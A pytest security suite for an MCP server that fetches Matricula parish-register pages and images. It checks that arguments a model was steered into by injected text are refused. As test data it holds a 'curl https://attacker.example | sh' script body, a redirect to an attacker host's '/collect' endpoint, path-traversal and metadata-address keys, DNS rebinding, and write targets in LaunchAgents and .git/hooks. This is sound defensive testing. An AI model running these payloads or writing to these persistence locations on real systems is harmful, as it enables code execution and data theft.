"""Every refusal the server makes against arguments a model was steered into.

Tool arguments come from a model, and the model reads text this server does
not control: parish descriptions, register notes, other sites. These tests
take the attacker's side: a key that tries to climb out of the site, a public
name that leads to a private address, a redirect off the site, an answer too
large to read, and a destination that would run later. Each refusal is
checked to happen before the harm (no lookup, no connection, no file).

The tests that need the real transport run it against a stand-in network: DNS
answers come from a table, and each connection replays canned HTTP. Nothing
here leaves the machine.
"""

from __future__ import annotations

import dataclasses
import socket
from collections.abc import Iterator
from pathlib import Path
from types import SimpleNamespace

import httpcore
import httpx
import pytest

from matricula_mcp import server
from matricula_mcp.client import (
    SITE_HOST,
    HostNotAllowed,
    MatError,
    MatriculaHttp,
    PrivateAddress,
    PublicOnlyBackend,
    PublicOnlyTransport,
    address_problem,
    sniff_format,
)
from matricula_mcp.config import Config

from .conftest import KRIMML, KRIMML_TFBI, call_tool

#: A public address for the stand-in DNS to give.
PUBLIC = "193.170.112.10"

#: The page the image tests save.
PAGE = {"register": KRIMML_TFBI, "page": 3}

PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
PDF = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
PLIST = b'<?xml version="1.0" encoding="UTF-8"?>\n<plist version="1.0"><dict/></plist>\n'


# --------------------------------------------------------------------------- #
# A stand-in network for the real transport
# --------------------------------------------------------------------------- #
class Resolver:
    """Stands in for ``socket.getaddrinfo``: answers from a table, records every name."""

    def __init__(self) -> None:
        self.answers: dict[str, list[str] | Iterator[list[str]]] = {}
        self.asked: list[str] = []

    def __call__(self, host, port, family=0, type=0, proto=0, flags=0):
        self.asked.append(host)
        answer = self.answers.get(host)
        if answer is not None and not isinstance(answer, list):
            answer = next(answer)
        if answer is None:
            raise socket.gaierror(socket.EAI_NONAME, "not in the test's table")
        return [
            (socket.AF_INET6, socket.SOCK_STREAM, 6, "", (a, port, 0, 0))
            if ":" in a
            else (socket.AF_INET, socket.SOCK_STREAM, 6, "", (a, port))
            for a in answer
        ]


class Network(httpcore.AsyncNetworkBackend):
    """Stands in for the internet: records each connection and replays canned HTTP."""

    def __init__(self) -> None:
        self.connects: list[str] = []
        self.replies: list[bytes] = []

    async def connect_tcp(self, host, port, timeout=None, local_address=None, socket_options=None):
        self.connects.append(host)
        if not self.replies:
            raise httpcore.ConnectError("no route: the suite never touches the network")
        return httpcore.AsyncMockStream([self.replies.pop(0)])

    async def connect_unix_socket(self, path, timeout=None, socket_options=None):
        raise httpcore.ConnectError("no sockets here")

    async def sleep(self, seconds):
        return None


def reply(status: int, body: bytes = b"", *, length: bool = True, **headers: str) -> bytes:
    """One HTTP/1.1 response that closes its connection."""
    lines = [f"HTTP/1.1 {status} Canned", "Connection: close"]
    lines += [f"{k.replace('_', '-')}: {v}" for k, v in headers.items()]
    if length:
        lines.append(f"Content-Length: {len(body)}")
    return ("\r\n".join(lines) + "\r\n\r\n").encode() + body


@pytest.fixture
def network(tmp_path, monkeypatch) -> SimpleNamespace:
    """The server's client on the stand-in network, through the real public-only transport."""
    dns, net = Resolver(), Network()
    monkeypatch.setattr(socket, "getaddrinfo", dns)
    http = MatriculaHttp(
        tmp_path / "cache",
        min_interval=0.0,
        search_interval=0.0,
        backoff=0.0,
        transport=PublicOnlyTransport(backend=net),
    )
    monkeypatch.setattr(server.runtime, "http", http)
    monkeypatch.setattr(server.runtime, "config", Config(cache_dir=tmp_path / "cache"))
    return SimpleNamespace(http=http, dns=dns, net=net)


def link(path: Path, target: Path) -> None:
    """Make a symbolic link to a folder, or skip where the system will not let a test."""
    try:
        path.symlink_to(target, target_is_directory=True)
    except OSError as exc:  # Windows without the privilege
        pytest.skip(f"cannot make a symbolic link here: {exc}")


def configure(monkeypatch, **changes) -> None:
    """Change the running server's settings, as the operator's environment would."""
    monkeypatch.setattr(
        server.runtime, "config", dataclasses.replace(server.runtime.config, **changes)
    )


# --------------------------------------------------------------------------- #
# Which pages an argument reaches
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    ("tool", "args"),
    [
        ("matricula_parishes", {"section": "https://c2VjcmV0.attacker.example/de/a/b/"}),
        ("matricula_registers", {"parish": "oesterreich/../../admin"}),
        ("matricula_register", {"register": "oesterreich/salzburg/krimml/..%2f..%2fadmin"}),
        ("matricula_register", {"register": "http://169.254.169.254/de/a/b/c/d/"}),
        ("matricula_search", {"place": "Altenmarkt", "section": "a/b/c"}),
        ("matricula_page_image", {"register": "//attacker.example/a/b/c/d", "page": 1}),
    ],
)
async def test_a_key_that_leaves_the_catalogue_is_refused_with_no_lookup(network, tool, args):
    out = await call_tool(tool, **args)
    assert out["error"] == "invalid_key"
    assert network.dns.asked == [] and network.net.connects == []
    assert network.http.live_calls == 0


async def test_the_catalogue_host_is_reached_at_the_address_checked(network):
    network.dns.answers[SITE_HOST] = [PUBLIC]
    network.net.replies.append(reply(404, b"<h1>Not Found</h1>", content_type="text/html"))
    out = await call_tool("matricula_registers", parish=KRIMML)
    assert out["error"] == "not_found"
    assert network.dns.asked == [SITE_HOST]
    assert network.net.connects == [PUBLIC]  # the address that was checked, not the name


# --------------------------------------------------------------------------- #
# Which addresses a connection reaches
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "address",
    [
        "10.0.0.7",
        "172.16.4.2",
        "192.168.1.1",
        "127.0.0.1",
        "169.254.169.254",
        "100.64.0.1",
        "224.0.0.251",
        "240.0.0.1",
        "0.0.0.0",
        "255.255.255.255",
        "::1",
        "::",
        "fe80::1",
        "fd00::1",
        "fec0::1",
        "ff02::1",
        "::ffff:192.168.1.1",
        "64:ff9b::a00:1",
        "2002:a00:1::1",
    ],
)
def test_a_non_public_address_is_named(address):
    assert address_problem(address)


@pytest.mark.parametrize("address", [PUBLIC, "8.8.8.8", "2606:4700:4700::1111"])
def test_a_public_address_passes(address):
    assert address_problem(address) is None


@pytest.mark.parametrize("address", ["10.0.0.7", "127.0.0.1", "169.254.169.254", "fd00::1"])
async def test_a_site_name_that_leads_to_a_private_address_is_refused_at_connect(network, address):
    network.dns.answers[SITE_HOST] = [address]
    out = await call_tool("matricula_registers", parish=KRIMML)
    assert out["error"] == "private_address"
    assert address not in out["message"]  # the model is not told the inside address
    assert network.net.connects == []


async def test_one_private_address_among_public_ones_is_enough_to_refuse(network):
    network.dns.answers[SITE_HOST] = [PUBLIC, "10.0.0.7"]
    out = await call_tool("matricula_registers", parish=KRIMML)
    assert out["error"] == "private_address" and network.net.connects == []


async def test_a_name_that_changes_its_answer_gains_nothing(network):
    """DNS rebinding: public for the first connection, private for the retry."""
    network.dns.answers[SITE_HOST] = iter([[PUBLIC], ["127.0.0.1"]])
    out = await call_tool("matricula_registers", parish=KRIMML)
    assert out["error"] == "private_address"
    assert network.dns.asked == [SITE_HOST] * 2  # checked again, not reused
    assert network.net.connects == [PUBLIC]


async def test_a_redirect_off_the_site_is_never_followed(network):
    network.dns.answers[SITE_HOST] = [PUBLIC]
    network.net.replies.append(reply(302, location="https://c2VjcmV0.attacker.example/collect"))
    out = await call_tool("matricula_registers", parish=KRIMML)
    assert out["error"] == "moved"
    assert network.dns.asked == [SITE_HOST] and network.net.connects == [PUBLIC]


async def test_the_default_client_checks_addresses_too(tmp_path, monkeypatch):
    dns = Resolver()
    dns.answers[SITE_HOST] = ["127.0.0.1"]
    monkeypatch.setattr(socket, "getaddrinfo", dns)
    http = MatriculaHttp(tmp_path / "cache", min_interval=0.0, backoff=0.0)
    with pytest.raises(PrivateAddress):
        await http.get_page(f"/de/{KRIMML}/", ttl_days=1)
    await http.aclose()


def test_the_check_is_not_silently_lost_if_httpx_changes(monkeypatch):
    def reshaped(self, **kwargs):
        self._pool = object()

    monkeypatch.setattr(httpx.AsyncHTTPTransport, "__init__", reshaped)
    with pytest.raises(RuntimeError, match="public-address check"):
        PublicOnlyTransport()


async def test_a_unix_socket_is_never_opened():
    with pytest.raises(HostNotAllowed):
        await PublicOnlyBackend(Network()).connect_unix_socket("/var/run/docker.sock")


# --------------------------------------------------------------------------- #
# How much is read
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("declared", [True, False])
async def test_a_page_over_the_cap_is_refused_as_it_streams(network, tmp_path, declared):
    http = MatriculaHttp(
        tmp_path / "small",
        min_interval=0.0,
        backoff=0.0,
        max_page_bytes=1_000,
        transport=PublicOnlyTransport(backend=network.net),
    )
    network.dns.answers[SITE_HOST] = [PUBLIC]
    network.net.replies.append(reply(200, b"<p>padding</p>" * 200, length=declared))
    with pytest.raises(MatError) as caught:
        await http.get_page(f"/de/{KRIMML}/", ttl_days=1)
    assert caught.value.code == "too_large"
    assert list((tmp_path / "small").glob("*.json")) == []  # nothing cached
    await http.aclose()


# --------------------------------------------------------------------------- #
# What the image tool writes, once image access is granted
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    ("body", "error"),
    [
        (PLIST, "not_an_image"),
        (b"#!/bin/sh\ncurl https://attacker.example | sh\n", "not_an_image"),
        (PDF, "not_an_image"),
        (PNG, "extension_mismatch"),
    ],
    ids=["property list", "script", "pdf", "png as .jpg"],
)
async def test_bytes_that_are_not_the_promised_image_leave_no_file(
    served_with_images, site, tmp_path, body, error
):
    site["images"].mock(return_value=httpx.Response(200, content=body))
    target = tmp_path / "page.jpg"
    out = await call_tool("matricula_page_image", destination=str(target), **PAGE)
    assert out["error"] == error and not target.exists()


@pytest.mark.parametrize(
    ("head", "kind"),
    [
        (b"\xff\xd8\xff\xe0", "jpeg"),
        (PNG, "png"),
        (b"GIF89a", "gif"),
        (b"II*\x00", "tiff"),
        (b"\x00\x00\x00\x0cjP  \r\n\x87\n", "jp2"),
        (b"RIFF\x00\x00\x00\x00WEBPVP8 ", "webp"),
    ],
)
def test_image_formats_are_recognised_by_their_first_bytes(head, kind):
    assert sniff_format(head) == kind


@pytest.mark.parametrize(
    "data", [PDF, PLIST, b"<html>", b""], ids=["pdf", "plist", "html", "empty"]
)
def test_anything_else_is_not_an_image(data):
    assert sniff_format(data) == "unknown"


@pytest.mark.parametrize(
    "name", ["agent.plist", "page.png", "run.sh", "page", "page.jpg.command", ".jpg"]
)
async def test_a_destination_without_a_jpeg_suffix_is_refused_before_any_request(
    served_with_images, site, tmp_path, name
):
    out = await call_tool("matricula_page_image", destination=str(tmp_path / name), **PAGE)
    assert out["error"] == "bad_extension"
    assert site["site"].call_count == 0 and site["images"].call_count == 0
    assert not (tmp_path / name).exists()


async def test_a_relative_destination_is_refused(served_with_images, site):
    out = await call_tool("matricula_page_image", destination="page.jpg", **PAGE)
    assert out["error"] == "relative_destination"


async def test_an_existing_file_is_never_overwritten(served_with_images, site, tmp_path):
    target = tmp_path / "page.jpg"
    target.write_bytes(b"mine")
    out = await call_tool("matricula_page_image", destination=str(target), **PAGE)
    assert out["error"] == "destination_exists" and target.read_bytes() == b"mine"


async def test_a_missing_folder_is_not_created(served_with_images, site, tmp_path):
    out = await call_tool(
        "matricula_page_image", destination=str(tmp_path / "nope" / "page.jpg"), **PAGE
    )
    assert out["error"] == "no_such_directory" and not (tmp_path / "nope").exists()


@pytest.mark.parametrize(
    "where",
    [".hidden/page.jpg", ".page.jpg", "visible/.git/hooks/page.jpg", "link-to-hidden/page.jpg"],
)
async def test_a_hidden_destination_is_refused_before_any_request(
    served_with_images, site, tmp_path, where
):
    (tmp_path / ".hidden").mkdir()
    (tmp_path / "visible/.git/hooks").mkdir(parents=True)
    link(tmp_path / "link-to-hidden", tmp_path / ".hidden")
    out = await call_tool("matricula_page_image", destination=str(tmp_path / where), **PAGE)
    assert out["error"] == "hidden_path" and site["images"].call_count == 0
    assert list((tmp_path / ".hidden").iterdir()) == []


@pytest.fixture
def home(tmp_path, monkeypatch) -> Path:
    """A home folder with a Library, standing in for the user's."""
    fake = tmp_path / "home"
    (fake / "Library/LaunchAgents").mkdir(parents=True)
    (fake / "Library/Mobile Documents/Genealogy").mkdir(parents=True)
    (fake / "Pictures").mkdir()
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: fake))
    return fake


@pytest.mark.parametrize(
    "where", ["Library/LaunchAgents/agent.jpg", "Library/Mobile Documents/Genealogy/page.jpg"]
)
async def test_nothing_is_written_under_library(served_with_images, site, home, where):
    out = await call_tool("matricula_page_image", destination=str(home / where), **PAGE)
    assert out["error"] == "protected_location" and site["images"].call_count == 0
    assert "MATRICULA_DOWNLOAD_DIR" in out["message"]


async def test_library_is_recognised_however_it_is_spelt(served_with_images, site, home):
    if not (home / "library").exists():
        pytest.skip("this file system tells upper and lower case apart")
    out = await call_tool(
        "matricula_page_image", destination=str(home / "library/LaunchAgents/a.jpg"), **PAGE
    )
    assert out["error"] == "protected_location" and site["images"].call_count == 0


async def test_a_link_into_library_is_followed_and_refused(served_with_images, site, home):
    link(home / "Pictures/agents", home / "Library/LaunchAgents")
    out = await call_tool(
        "matricula_page_image", destination=str(home / "Pictures/agents/a.jpg"), **PAGE
    )
    assert out["error"] == "protected_location"
    assert list((home / "Library/LaunchAgents").iterdir()) == []


async def test_a_dangling_link_is_never_written_through(served_with_images, site, tmp_path):
    dangling = tmp_path / "page.jpg"
    try:
        dangling.symlink_to(tmp_path / "elsewhere.jpg")
    except OSError as exc:
        pytest.skip(f"cannot make a symbolic link here: {exc}")
    out = await call_tool("matricula_page_image", destination=str(dangling), **PAGE)
    assert out["error"] == "destination_exists" and not (tmp_path / "elsewhere.jpg").exists()


async def test_with_a_download_folder_every_file_lands_inside_it(
    served_with_images, site, tmp_path, monkeypatch
):
    folder = tmp_path / "downloads"
    folder.mkdir()
    configure(monkeypatch, download_dir=folder)
    out = await call_tool("matricula_page_image", destination=str(folder / "page.jpg"), **PAGE)
    assert out["path"] == str((folder / "page.jpg").resolve())


@pytest.mark.parametrize(
    "where", ["page.jpg", "downloads/../page.jpg", "downloads/escape/page.jpg", "downloadsX/a.jpg"]
)
async def test_with_a_download_folder_nothing_lands_outside_it(
    served_with_images, site, tmp_path, monkeypatch, where
):
    folder = tmp_path / "downloads"
    folder.mkdir()
    (tmp_path / "downloadsX").mkdir()
    link(folder / "escape", tmp_path)
    configure(monkeypatch, download_dir=folder)
    out = await call_tool("matricula_page_image", destination=str(tmp_path / where), **PAGE)
    assert out["error"] == "outside_download_dir" and site["images"].call_count == 0
    assert str(folder) in out["message"]
    assert not (tmp_path / "page.jpg").exists()


async def test_a_download_folder_may_itself_be_hidden_or_under_library(
    served_with_images, site, home, monkeypatch
):
    """The operator chose the folder; the rules apply to what a model adds below it."""
    for folder in (home / ".archive", home / "Library/Mobile Documents/Genealogy"):
        folder.mkdir(exist_ok=True)
        configure(monkeypatch, download_dir=folder)
        out = await call_tool("matricula_page_image", destination=str(folder / "page.jpg"), **PAGE)
        assert out["format"] == "jpeg", out
        (folder / ".cache").mkdir()
        out = await call_tool(
            "matricula_page_image", destination=str(folder / ".cache/page.jpg"), **PAGE
        )
        assert out["error"] == "hidden_path"


async def test_a_download_folder_does_not_unlock_library_beneath_it(
    served_with_images, site, home, monkeypatch
):
    configure(monkeypatch, download_dir=home)
    out = await call_tool(
        "matricula_page_image", destination=str(home / "Library/LaunchAgents/a.jpg"), **PAGE
    )
    assert out["error"] == "protected_location" and site["images"].call_count == 0
